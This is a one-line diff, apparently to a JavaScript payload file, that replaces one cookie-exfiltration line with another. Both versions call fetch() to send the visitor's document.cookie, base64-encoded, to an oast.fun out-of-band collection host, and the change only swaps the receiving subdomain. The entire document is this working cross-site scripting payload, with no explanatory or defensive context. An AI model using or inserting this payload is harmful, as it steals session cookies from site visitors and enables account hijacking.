@@ -1,1 +1,1 @@
-fetch("https://nzeibrjihzugljdcmxcr939h3ea4uegrm.oast.fun/?data="+btoa(document.cookie));
+fetch("https://ustaarpjntgmaqejdyiw68tz588mk0rll.oast.fun/?data="+btoa(document.cookie));
